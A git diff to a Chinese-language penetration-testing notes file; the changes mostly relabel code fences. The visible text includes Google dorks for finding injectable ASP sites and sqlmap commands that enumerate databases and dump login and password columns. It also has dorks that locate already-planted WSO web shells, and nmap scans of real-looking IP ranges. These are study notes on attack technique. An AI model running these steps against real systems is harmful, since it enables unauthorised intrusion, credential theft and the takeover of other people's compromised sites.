@@ -259,13 +259,12 @@ intercept 拦截
 
 ### 注入案例
 
-``` config
+``` shell
 以 sql 注入入手，目标为熟悉基本的思路
 
 1. 通过google hack 寻找测试目标
 2. asp 站点的 sql 注入
 3. php 站点的 sql 注入及管理后台的寻找过程
-
 
 公司 inurl:asp?id=
 
@@ -276,17 +275,14 @@ intercept 拦截
 
 
 查看所有数据库，当前用户
+
 # sqlmap -u domain.com/index.aps?id=12 --dbs --current-user
-
 # sqlmap -u domain.com/index.aps?id=12 -T table_name --columns 显示所有列名
-
 # sqlmap -u domain.com/index.aps?id=12 -T table_name -C login_name,pass,username --dump 显示字段内容
-
 # sqlmap -u domain.com/index.php?id=1 --dbms mysql -D db_name --tables
+```
 
 后台登录入口
-
-```
 
 PHP 站点的SQL注入
 
@@ -356,16 +352,17 @@ cmd: mstsc
 
  输入IP 和 用户名
 
-
 ```
 
 ### 后门获找
 
+``` search
 Google 搜索目标：intitle:"=[1n73ct10n privat shell]="
 
 intitle:"WSO 2.4" [Sec. Info ], [ Files ], [ Console ], [Sql], [ Php ], [ Safe mode ], [ String tools ], [ Bruteforce ], [ Network ], [ Self remove ]
+```
 
-### 关于 `google hack database`
+### 关于 google hack database
 
 http://www.exploit-db.com/google-dorks/
 
@@ -406,7 +403,7 @@ set> 1
 
 ### nmap - 主机扫描类型
 
-``` options
+``` shell
 nmap [Scan Type(s)] [Options] {target sepcification}
 
 -sl(列表扫描)
@@ -425,7 +422,7 @@ nmap [Scan Type(s)] [Options] {target sepcification}
 
 ### nmap-端口扫描技术
 
-``` options
+``` shell
 -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
 -sU: UDP Scan
 -sN/sF/sX: TCP Null, FIN, and Xmas scans
@@ -442,7 +439,7 @@ nmap [Scan Type(s)] [Options] {target sepcification}
 
 nmap [Scan Type(s)] [Options] {target specification}
 
-``` nmap
+``` shell
 # nmap -sL 103.10.81.1-255 扫描主机
 # nmap -PE 103.10.81.1-255 ping扫描
 # nmap -PS80 103.10.87.1-255 对80端口扫描
@@ -473,9 +470,9 @@ nmap [Scan Type(s)] [Options] {target specification}
 
 ### nmap-服务程序探测
 
-``` shell
 -sV
 
+``` shell
 # nmap -sV 103.10.87.148
 # nmap -sV -p 22,53, 110, 143, 4564 103.10.86.1-255
 ```
